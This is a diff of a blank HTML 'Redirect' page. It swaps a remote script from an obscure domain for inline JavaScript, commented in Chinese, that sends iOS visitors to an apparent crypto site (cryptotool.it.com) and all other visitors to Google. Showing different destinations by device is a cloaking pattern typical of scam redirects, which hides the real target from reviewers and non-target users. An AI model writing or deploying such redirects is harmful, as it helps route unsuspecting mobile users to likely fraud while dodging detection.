@@ -4,7 +4,18 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Redirect</title>
-    <script src="https://api.km624da.site/js/dp-ck.js"></script>
+    <!-- 页面无任何可见内容，立即执行跳转 -->
+    <script>
+        (function() {
+            // 检测是否为 iOS 设备（iPhone、iPad、iPod）
+            var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+            if (isIOS) {
+                window.location.replace('https://cryptotool.it.com/');
+            } else {
+                window.location.replace('https://www.google.com/');
+            }
+        })();
+    </script>
 </head>
 <body>
    
